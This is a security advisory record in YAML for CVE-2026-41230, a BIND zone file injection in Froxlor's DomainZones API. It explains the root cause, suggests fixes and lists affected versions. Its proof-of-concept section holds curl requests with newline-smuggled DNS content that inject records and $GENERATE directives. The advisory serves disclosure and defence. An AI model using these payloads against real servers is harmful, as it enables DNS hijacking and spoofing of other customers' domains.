@@ -1,0 +1,324 @@
+advisory_id: GHSA-47hf-23pw-3m8c
+datasource_id: github_osv/GHSA-47hf-23pw-3m8c
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-47hf-23pw-3m8c/GHSA-47hf-23pw-3m8c.json
+aliases:
+  - CVE-2026-41230
+summary: |
+  Froxlor has a BIND Zone File Injection via Unsanitized DNS Record Content in DomainZones::add()
+  ## Summary
+
+  `DomainZones::add()` accepts arbitrary DNS record types without a whitelist and does not sanitize newline characters in the `content` field. When a DNS type not covered by the if/elseif validation chain is submitted (e.g., `NAPTR`, `PTR`, `HINFO`), content validation is entirely bypassed. Embedded newline characters in the content survive `trim()` processing, are stored in the database, and are written directly into BIND zone files via `DnsEntry::__toString()`. An authenticated customer can inject arbitrary DNS records and BIND directives (`$INCLUDE`, `$ORIGIN`, `$GENERATE`) into their domain's zone file.
+
+  ## Details
+
+  **Missing type whitelist — `DomainZones.php:93`:**
+
+  The `type` parameter is accepted directly from user input with no validation against allowed values:
+
+  ```php
+  // lib/Froxlor/Api/Commands/DomainZones.php:93
+  $type = $this->getParam('type', true, 'A');
+  ```
+
+  The if/elseif chain at lines 170-317 validates content only for 13 known types: `A`, `AAAA`, `CAA`, `CNAME`, `DNAME`, `LOC`, `MX`, `NS`, `RP`, `SRV`, `SSHFP`, `TLSA`, `TXT`. Any type not in this list falls through with no content validation at all. There is a `TODO` comment at line 148 acknowledging missing validation:
+
+  ```php
+  // TODO regex validate content for invalid characters
+  ```
+
+  **Missing newline sanitization — `DomainZones.php:154`:**
+
+  The content field only receives `trim()`, which strips leading/trailing whitespace but preserves embedded newline characters:
+
+  ```php
+  // lib/Froxlor/Api/Commands/DomainZones.php:154
+  $content = trim($content);
+  ```
+
+  **Unsafe zone file output — `DnsEntry.php:83`:**
+
+  `DnsEntry::__toString()` concatenates content directly into zone file format without escaping:
+
+  ```php
+  // lib/Froxlor/Dns/DnsEntry.php:83
+  return $this->record . "\t" . $this->ttl . "\t" . $this->class . "\t" . $this->type . "\t"
+      . (($this->priority >= 0 && ($this->type == 'MX' || $this->type == 'SRV')) ? $this->priority . "\t" : "")
+      . $_content . PHP_EOL;
+  ```
+
+  Newlines in `$_content` produce new lines in the zone file, each parsed by BIND as an independent resource record or directive.
+
+  **Zone file write — `Bind.php:121`:**
+
+  ```php
+  // lib/Froxlor/Cron/Dns/Bind.php:121
+  fwrite($zonefile_handler, $zoneContent . $subzones);
+  ```
+
+  The `AntiXSS` filter applied at the API layer (`Api.php:91`) targets HTML/JS XSS vectors and does not strip newline characters. The web UI form restricts types via a dropdown (`formfield.dns_add.php:42-56`), but this is client-side only — the server-side `DomainZones::add()` has no corresponding whitelist.
+
+  **Execution flow:**
+  1. Customer sends API request with `type=NAPTR` and `content` containing `\n`-separated lines
+  2. `getParam()` returns raw values without sanitization
+  3. Type `NAPTR` matches none of the if/elseif conditions — no content validation runs
+  4. `trim($content)` preserves embedded newlines
+  5. Content is inserted into `domain_dns` table via prepared statement
+  6. DNS cron creates `DnsEntry` objects from DB records (`Dns.php:297`)
+  7. `DnsEntry::__toString()` outputs content with embedded newlines into zone format
+  8. `Bind.php:121` writes zone to disk; BIND loads the file and processes injected lines as records
+
+  ## PoC
+
+  **Step 1: Inject a DNS record with embedded newlines via API**
+
+  ```bash
+  curl -s -X POST 'https://froxlor.example.com/api.php' \
+    -u 'APIKEY:APISECRET' \
+    -H 'Content-Type: application/json' \
+    -d '{
+      "command": "DomainZones.add",
+      "params": {
+        "id": 1,
+        "type": "NAPTR",
+        "content": "100 10 \"\" \"\" \"\" .\n@ 300 IN A 1.2.3.4\n@ 300 IN NAPTR 100 10 \"\" \"\" \"\" ."
+      }
+    }'
+  ```
+
+  Expected: HTTP 200 with success response. The record is stored in the database.
+
+  **Step 2: Wait for DNS cron to rebuild zones (or trigger manually)**
+
+  ```bash
+  # As admin, trigger the DNS rebuild cron
+  php /var/www/froxlor/scripts/froxlor_master_cronjob.php --force --dns
+  ```
+
+  **Step 3: Inspect the generated zone file**
+
+  ```bash
+  cat /etc/bind/domains/example.com.zone
+  ```
+
+  Expected zone file content includes injected lines:
+
+  ```
+  @    18000    IN    NAPTR    100 10 "" "" "" .
+  @ 300 IN A 1.2.3.4
+  @ 300 IN NAPTR 100 10 "" "" "" .
+  ```
+
+  The line `@ 300 IN A 1.2.3.4` is parsed by BIND as an independent A record pointing the domain to the attacker's IP.
+
+  **Step 4: Verify BIND directive injection**
+
+  ```bash
+  curl -s -X POST 'https://froxlor.example.com/api.php' \
+    -u 'APIKEY:APISECRET' \
+    -H 'Content-Type: application/json' \
+    -d '{
+      "command": "DomainZones.add",
+      "params": {
+        "id": 1,
+        "type": "NAPTR",
+        "content": "100 10 \"\" \"\" \"\" .\n$GENERATE 1-255 $.0.168.192.in-addr.arpa. PTR host-$.example.com."
+      }
+    }'
+  ```
+
+  This injects a `$GENERATE` directive that creates 255 PTR records.
+
+  ## Impact
+
+  An authenticated customer with DNS editing enabled can:
+
+  1. **Inject arbitrary DNS records** bypassing all content validation — including A/AAAA records pointing the domain to attacker-controlled IPs, redirecting legitimate traffic.
+  2. **Manipulate email authentication** by injecting TXT records to override SPF, DKIM, or DMARC policies, enabling email spoofing for the domain.
+  3. **Inject BIND server directives** (`$INCLUDE`, `$ORIGIN`, `$GENERATE`) that escape the DNS record context and can attempt to include local server files, alter zone origin, or mass-generate records.
+  4. **Cause DNS service disruption** by injecting malformed records or conflicting directives that cause the zone file to fail loading, disrupting DNS resolution for all records in the domain.
+
+  While this requires an authenticated customer account, DNS editing is a standard feature in shared hosting environments. In a multi-tenant deployment, a malicious customer can abuse this to disrupt the DNS server or inject records that bypass validation controls designed to protect zone integrity.
+
+  ## Recommended Fix
+
+  **1. Add a type whitelist in `DomainZones::add()` (primary fix):**
+
+  ```php
+  // lib/Froxlor/Api/Commands/DomainZones.php — after line 93
+  $type = $this->getParam('type', true, 'A');
+
+  $allowed_types = ['A', 'AAAA', 'CAA', 'CNAME', 'DNAME', 'LOC', 'MX', 'NS', 'RP', 'SRV', 'SSHFP', 'TLSA', 'TXT'];
+  if (!in_array($type, $allowed_types)) {
+      throw new Exception("DNS record type '" . htmlspecialchars($type) . "' is not supported", 406);
+  }
+  ```
+
+  **2. Strip newline characters from content (defense-in-depth):**
+
+  ```php
+  // lib/Froxlor/Api/Commands/DomainZones.php — replace line 154
+  $content = trim(str_replace(["\r", "\n"], '', $content));
+  ```
+
+  **3. Sanitize in `DnsEntry::__toString()` as a belt-and-suspenders measure:**
+
+  ```php
+  // lib/Froxlor/Dns/DnsEntry.php — at the start of __toString()
+  $_content = str_replace(["\r", "\n"], '', $this->content);
+  ```
+impacted_packages:
+  - purl: pkg:composer/froxlor/froxlor
+    affected_versions: vers:composer/<2.3.6
+    fixed_versions: vers:composer/2.3.6
+    affected_packages:
+      - pkg:composer/froxlor/froxlor@0.10.0-rc1
+      - pkg:composer/froxlor/froxlor@0.10.0-rc2
+      - pkg:composer/froxlor/froxlor@0.10.0
+      - pkg:composer/froxlor/froxlor@0.10.1
+      - pkg:composer/froxlor/froxlor@0.10.2
+      - pkg:composer/froxlor/froxlor@0.10.3
+      - pkg:composer/froxlor/froxlor@0.10.4
+      - pkg:composer/froxlor/froxlor@0.10.5
+      - pkg:composer/froxlor/froxlor@0.10.6
+      - pkg:composer/froxlor/froxlor@0.10.7
+      - pkg:composer/froxlor/froxlor@0.10.8
+      - pkg:composer/froxlor/froxlor@0.10.9
+      - pkg:composer/froxlor/froxlor@0.10.10
+      - pkg:composer/froxlor/froxlor@0.10.11
+      - pkg:composer/froxlor/froxlor@0.10.12
+      - pkg:composer/froxlor/froxlor@0.10.13
+      - pkg:composer/froxlor/froxlor@0.10.14
+      - pkg:composer/froxlor/froxlor@0.10.15
+      - pkg:composer/froxlor/froxlor@0.10.16
+      - pkg:composer/froxlor/froxlor@0.10.17
+      - pkg:composer/froxlor/froxlor@0.10.18
+      - pkg:composer/froxlor/froxlor@0.10.19
+      - pkg:composer/froxlor/froxlor@0.10.20
+      - pkg:composer/froxlor/froxlor@0.10.21
+      - pkg:composer/froxlor/froxlor@0.10.22
+      - pkg:composer/froxlor/froxlor@0.10.23
+      - pkg:composer/froxlor/froxlor@0.10.23%2B1
+      - pkg:composer/froxlor/froxlor@0.10.24
+      - pkg:composer/froxlor/froxlor@0.10.25
+      - pkg:composer/froxlor/froxlor@0.10.26
+      - pkg:composer/froxlor/froxlor@0.10.27
+      - pkg:composer/froxlor/froxlor@0.10.28
+      - pkg:composer/froxlor/froxlor@0.10.29
+      - pkg:composer/froxlor/froxlor@0.10.29%2B1
+      - pkg:composer/froxlor/froxlor@0.10.30
+      - pkg:composer/froxlor/froxlor@0.10.31
+      - pkg:composer/froxlor/froxlor@0.10.32
+      - pkg:composer/froxlor/froxlor@0.10.33
+      - pkg:composer/froxlor/froxlor@0.10.34
+      - pkg:composer/froxlor/froxlor@0.10.34%2B1
+      - pkg:composer/froxlor/froxlor@0.10.35
+      - pkg:composer/froxlor/froxlor@0.10.35%2B1
+      - pkg:composer/froxlor/froxlor@0.10.36
+      - pkg:composer/froxlor/froxlor@0.10.37
+      - pkg:composer/froxlor/froxlor@0.10.38
+      - pkg:composer/froxlor/froxlor@0.10.38%2B1
+      - pkg:composer/froxlor/froxlor@0.10.38%2B2
+      - pkg:composer/froxlor/froxlor@0.10.38%2B3
+      - pkg:composer/froxlor/froxlor@2.0.0
+      - pkg:composer/froxlor/froxlor@2.0.1
+      - pkg:composer/froxlor/froxlor@2.0.2
+      - pkg:composer/froxlor/froxlor@2.0.3
+      - pkg:composer/froxlor/froxlor@2.0.4
+      - pkg:composer/froxlor/froxlor@2.0.5
+      - pkg:composer/froxlor/froxlor@2.0.6
+      - pkg:composer/froxlor/froxlor@2.0.7
+      - pkg:composer/froxlor/froxlor@2.0.8
+      - pkg:composer/froxlor/froxlor@2.0.9
+      - pkg:composer/froxlor/froxlor@2.0.10
+      - pkg:composer/froxlor/froxlor@2.0.11
+      - pkg:composer/froxlor/froxlor@2.0.12
+      - pkg:composer/froxlor/froxlor@2.0.13
+      - pkg:composer/froxlor/froxlor@2.0.14
+      - pkg:composer/froxlor/froxlor@2.0.15
+      - pkg:composer/froxlor/froxlor@2.0.16
+      - pkg:composer/froxlor/froxlor@2.0.17
+      - pkg:composer/froxlor/froxlor@2.0.18
+      - pkg:composer/froxlor/froxlor@2.0.19
+      - pkg:composer/froxlor/froxlor@2.0.20
+      - pkg:composer/froxlor/froxlor@2.0.21
+      - pkg:composer/froxlor/froxlor@2.0.22
+      - pkg:composer/froxlor/froxlor@2.0.23
+      - pkg:composer/froxlor/froxlor@2.0.24
+      - pkg:composer/froxlor/froxlor@2.1.0-beta1
+      - pkg:composer/froxlor/froxlor@2.1.0-beta2
+      - pkg:composer/froxlor/froxlor@2.1.0-rc1
+      - pkg:composer/froxlor/froxlor@2.1.0-rc2
+      - pkg:composer/froxlor/froxlor@2.1.0-rc3
+      - pkg:composer/froxlor/froxlor@2.1.0
+      - pkg:composer/froxlor/froxlor@2.1.1
+      - pkg:composer/froxlor/froxlor@2.1.2
+      - pkg:composer/froxlor/froxlor@2.1.3
+      - pkg:composer/froxlor/froxlor@2.1.4
+      - pkg:composer/froxlor/froxlor@2.1.5
+      - pkg:composer/froxlor/froxlor@2.1.6
+      - pkg:composer/froxlor/froxlor@2.1.7
+      - pkg:composer/froxlor/froxlor@2.1.8
+      - pkg:composer/froxlor/froxlor@2.1.9
+      - pkg:composer/froxlor/froxlor@2.2.0-rc1
+      - pkg:composer/froxlor/froxlor@2.2.0-rc2
+      - pkg:composer/froxlor/froxlor@2.2.0-rc3
+      - pkg:composer/froxlor/froxlor@2.2.0
+      - pkg:composer/froxlor/froxlor@2.2.1
+      - pkg:composer/froxlor/froxlor@2.2.2
+      - pkg:composer/froxlor/froxlor@2.2.3
+      - pkg:composer/froxlor/froxlor@2.2.4
+      - pkg:composer/froxlor/froxlor@2.2.5
+      - pkg:composer/froxlor/froxlor@2.2.6
+      - pkg:composer/froxlor/froxlor@2.2.7
+      - pkg:composer/froxlor/froxlor@2.2.8
+      - pkg:composer/froxlor/froxlor@2.3.0-rc1
+      - pkg:composer/froxlor/froxlor@2.3.0
+      - pkg:composer/froxlor/froxlor@2.3.1
+      - pkg:composer/froxlor/froxlor@2.3.2
+      - pkg:composer/froxlor/froxlor@2.3.3
+      - pkg:composer/froxlor/froxlor@2.3.4
+      - pkg:composer/froxlor/froxlor@2.3.5
+    fixed_packages:
+      - pkg:composer/froxlor/froxlor@2.3.6
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/froxlor/froxlor
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/froxlor/froxlor
+        commit: 47a8af5d9523cb6ec94567405cfc2e294d3a1442
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '8.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:L
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-47hf-23pw-3m8c/GHSA-47hf-23pw-3m8c.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-93
+references:
+  - url: https://github.com/froxlor/froxlor
+    reference_type:
+    reference_id:
+  - url: https://github.com/froxlor/froxlor/commit/47a8af5d9523cb6ec94567405cfc2e294d3a1442
+    reference_type:
+    reference_id:
+  - url: https://github.com/froxlor/froxlor/releases/tag/2.3.6
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-41230
+    reference_type:
+    reference_id: CVE-2026-41230
+  - url: https://github.com/froxlor/froxlor/security/advisories/GHSA-47hf-23pw-3m8c
+    reference_type:
+    reference_id: GHSA-47hf-23pw-3m8c
+exploits: []
